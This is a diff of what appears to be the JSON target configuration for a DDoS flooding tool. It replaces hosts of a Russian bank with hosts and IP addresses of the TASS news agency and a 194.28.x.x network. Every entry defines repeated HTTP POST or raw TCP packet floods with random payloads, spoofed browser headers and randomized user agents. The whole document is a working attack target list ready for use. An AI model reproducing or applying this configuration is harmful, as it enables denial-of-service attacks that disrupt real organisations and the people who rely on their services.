                             "body": "{{ random_payload 1000 }}"
@@ -999,14 +288,165 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://server70.ibank.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.236.87:5222",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "server70.ibank.absolutbank.ru:443",
+                        "address": "194.28.236.87:5222"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "http://msg.tass.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "msg.tass.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://msg.tass.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://msg.tass.ru",
+                                "Referer": "http://msg.tass.ru",
+                                "X-Forwarded-Host": "msg.tass.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.237.229:179",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.237.229:179"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.88:5222",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.88:5222"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.137:1935",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.137:1935"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.239.164:50001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.164:50001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.239.152",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.152:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1017,7 +457,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://server70.ibank.absolutbank.ru",
+                            "path": "https://194.28.239.152",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1030,9 +470,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://server70.ibank.absolutbank.ru",
-                                "Referer": "https://server70.ibank.absolutbank.ru",
-                                "X-Forwarded-Host": "server70.ibank.absolutbank.ru",
+                                "Origin": "https://194.28.239.152",
+                                "Referer": "https://194.28.239.152",
+                                "X-Forwarded-Host": "194.28.239.152",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1043,14 +483,36 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip27.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.239.175:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip27.absolutbank.ru:443",
+                        "address": "194.28.239.175:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.238.68",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.238.68:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1061,7 +523,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip27.absolutbank.ru",
+                            "path": "https://194.28.238.68",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1074,9 +536,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip27.absolutbank.ru",
-                                "Referer": "https://ip27.absolutbank.ru",
-                                "X-Forwarded-Host": "ip27.absolutbank.ru",
+                                "Origin": "https://194.28.238.68",
+                                "Referer": "https://194.28.238.68",
+                                "X-Forwarded-Host": "194.28.238.68",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1087,14 +549,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://ip16.absolutbank.ru",
+            "count": 16,
+            "name": "http://194.28.236.42",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip16.absolutbank.ru:80"
+                        "address": "194.28.236.42:80"
                     }
                 },
                 "packet": {
@@ -1102,7 +564,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://ip16.absolutbank.ru",
+                            "path": "http://194.28.236.42",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1115,9 +577,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip16.absolutbank.ru",
-                                "Referer": "http://ip16.absolutbank.ru",
-                                "X-Forwarded-Host": "ip16.absolutbank.ru",
+                                "Origin": "http://194.28.236.42",
+                                "Referer": "http://194.28.236.42",
+                                "X-Forwarded-Host": "194.28.236.42",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1128,14 +590,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip151.absolutbank.ru",
+            "count": 16,
+            "name": "https://mail.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip151.absolutbank.ru:443",
+                        "address": "mail.tass.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1146,7 +608,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip151.absolutbank.ru",
+                            "path": "https://mail.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1159,9 +621,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip151.absolutbank.ru",
-                                "Referer": "https://ip151.absolutbank.ru",
-                                "X-Forwarded-Host": "ip151.absolutbank.ru",
+                                "Origin": "https://mail.tass.ru",
+                                "Referer": "https://mail.tass.ru",
+                                "X-Forwarded-Host": "mail.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1172,137 +634,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://ip188.absolutbank.ru",
+            "count": 16,
+            "name": "https://194.28.239.190",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip188.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://ip188.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip188.absolutbank.ru",
-                                "Referer": "http://ip188.absolutbank.ru",
-                                "X-Forwarded-Host": "ip188.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://ip57.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip57.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://ip57.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip57.absolutbank.ru",
-                                "Referer": "http://ip57.absolutbank.ru",
-                                "X-Forwarded-Host": "ip57.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://193.28.234.34",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "193.28.234.34:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://193.28.234.34",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://193.28.234.34",
-                                "Referer": "http://193.28.234.34",
-                                "X-Forwarded-Host": "193.28.234.34",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip48.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip48.absolutbank.ru:443",
+                        "address": "194.28.239.190:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1313,7 +652,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip48.absolutbank.ru",
+                            "path": "https://194.28.239.190",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1326,9 +665,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip48.absolutbank.ru",
-                                "Referer": "https://ip48.absolutbank.ru",
-                                "X-Forwarded-Host": "ip48.absolutbank.ru",
+                                "Origin": "https://194.28.239.190",
+                                "Referer": "https://194.28.239.190",
+                                "X-Forwarded-Host": "194.28.239.190",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1339,14 +678,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://ip187.absolutbank.ru",
+            "count": 16,
+            "name": "http://194.28.239.190",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip187.absolutbank.ru:80"
+                        "address": "194.28.239.190:80"
                     }
                 },
                 "packet": {
@@ -1354,7 +693,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://ip187.absolutbank.ru",
+                            "path": "http://194.28.239.190",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1367,9 +706,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip187.absolutbank.ru",
-                                "Referer": "http://ip187.absolutbank.ru",
-                                "X-Forwarded-Host": "ip187.absolutbank.ru",
+                                "Origin": "http://194.28.239.190",
+                                "Referer": "http://194.28.239.190",
+                                "X-Forwarded-Host": "194.28.239.190",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1380,14 +719,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip188.absolutbank.ru",
+            "count": 16,
+            "name": "https://dmz-wsedge02-n01.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip188.absolutbank.ru:443",
+                        "address": "dmz-wsedge02-n01.tass.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1398,7 +737,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip188.absolutbank.ru",
+                            "path": "https://dmz-wsedge02-n01.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1411,9 +750,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip188.absolutbank.ru",
-                                "Referer": "https://ip188.absolutbank.ru",
-                                "X-Forwarded-Host": "ip188.absolutbank.ru",
+                                "Origin": "https://dmz-wsedge02-n01.tass.ru",
+                                "Referer": "https://dmz-wsedge02-n01.tass.ru",
+                                "X-Forwarded-Host": "dmz-wsedge02-n01.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1424,14 +763,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://91.199.156.38",
+            "count": 16,
+            "name": "https://ra.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.38:443",
+                        "address": "ra.tass.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1442,7 +781,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.199.156.38",
+                            "path": "https://ra.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1455,9 +794,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.199.156.38",
-                                "Referer": "https://91.199.156.38",
-                                "X-Forwarded-Host": "91.199.156.38",
+                                "Origin": "https://ra.tass.ru",
+                                "Referer": "https://ra.tass.ru",
+                                "X-Forwarded-Host": "ra.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1468,14 +807,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://jira.absolutbank.ru",
+            "count": 16,
+            "name": "https://194.28.239.67",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "jira.absolutbank.ru:443",
+                        "address": "194.28.239.67:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1486,7 +825,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://jira.absolutbank.ru",
+                            "path": "https://194.28.239.67",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1499,9 +838,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://jira.absolutbank.ru",
-                                "Referer": "https://jira.absolutbank.ru",
-                                "X-Forwarded-Host": "jira.absolutbank.ru",
+                                "Origin": "https://194.28.239.67",
+                                "Referer": "https://194.28.239.67",
+                                "X-Forwarded-Host": "194.28.239.67",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1512,14 +851,143 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://invest.absolutbank.ru",
+            "count": 16,
+            "name": "http://mail.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "invest.absolutbank.ru:443",
+                        "address": "mail.tass.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://mail.tass.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://mail.tass.ru",
+                                "Referer": "http://mail.tass.ru",
+                                "X-Forwarded-Host": "mail.tass.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.185:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.185:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.28:1352",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.28:1352"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.87:5061",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.87:5061"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.239.167:1935",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.167:1935"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.239.43",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.43:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1530,7 +998,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://invest.absolutbank.ru",
+                            "path": "https://194.28.239.43",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1543,9 +1011,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://invest.absolutbank.ru",
-                                "Referer": "https://invest.absolutbank.ru",
-                                "X-Forwarded-Host": "invest.absolutbank.ru",
+                                "Origin": "https://194.28.239.43",
+                                "Referer": "https://194.28.239.43",
+                                "X-Forwarded-Host": "194.28.239.43",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1556,14 +1024,80 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://91.199.156.34",
+            "count": 16,
+            "name": "tcp://194.28.236.4:21",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.34:443",
+                        "address": "194.28.236.4:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.237.231:179",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.237.231:179"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.87:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.87:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.237.1",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.237.1:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1574,7 +1108,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://91.199.156.34",
+                            "path": "https://194.28.237.1",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1587,9 +1121,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.199.156.34",
-                                "Referer": "https://91.199.156.34",
-                                "X-Forwarded-Host": "91.199.156.34",
+                                "Origin": "https://194.28.237.1",
+                                "Referer": "https://194.28.237.1",
+                                "X-Forwarded-Host": "194.28.237.1",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1600,55 +1134,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://absolutbank.ru",
+            "count": 16,
+            "name": "https://194.28.237.2",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://absolutbank.ru",
-                                "Referer": "http://absolutbank.ru",
-                                "X-Forwarded-Host": "absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip43.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip43.absolutbank.ru:443",
+                        "address": "194.28.237.2:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1659,7 +1152,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip43.absolutbank.ru",
+                            "path": "https://194.28.237.2",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1672,9 +1165,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip43.absolutbank.ru",
-                                "Referer": "https://ip43.absolutbank.ru",
-                                "X-Forwarded-Host": "ip43.absolutbank.ru",
+                                "Origin": "https://194.28.237.2",
+                                "Referer": "https://194.28.237.2",
+                                "X-Forwarded-Host": "194.28.237.2",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1685,14 +1178,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip16.absolutbank.ru",
+            "count": 16,
+            "name": "https://194.28.239.164",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip16.absolutbank.ru:443",
+                        "address": "194.28.239.164:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1703,7 +1196,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip16.absolutbank.ru",
+                            "path": "https://194.28.239.164",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1716,9 +1209,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip16.absolutbank.ru",
-                                "Referer": "https://ip16.absolutbank.ru",
-                                "X-Forwarded-Host": "ip16.absolutbank.ru",
+                                "Origin": "https://194.28.239.164",
+                                "Referer": "https://194.28.239.164",
+                                "X-Forwarded-Host": "194.28.239.164",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1729,14 +1222,36 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip44.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.239.141:13000",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip44.absolutbank.ru:443",
+                        "address": "194.28.239.141:13000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://194.28.239.153",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.239.153:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1747,7 +1262,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip44.absolutbank.ru",
+                            "path": "https://194.28.239.153",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1760,9 +1275,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip44.absolutbank.ru",
-                                "Referer": "https://ip44.absolutbank.ru",
-                                "X-Forwarded-Host": "ip44.absolutbank.ru",
+                                "Origin": "https://194.28.239.153",
+                                "Referer": "https://194.28.239.153",
+                                "X-Forwarded-Host": "194.28.239.153",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1773,14 +1288,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://nap.absolutbank.ru",
+            "count": 16,
+            "name": "https://194.28.239.151",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "nap.absolutbank.ru:443",
+                        "address": "194.28.239.151:443",
                         "tls_config": {
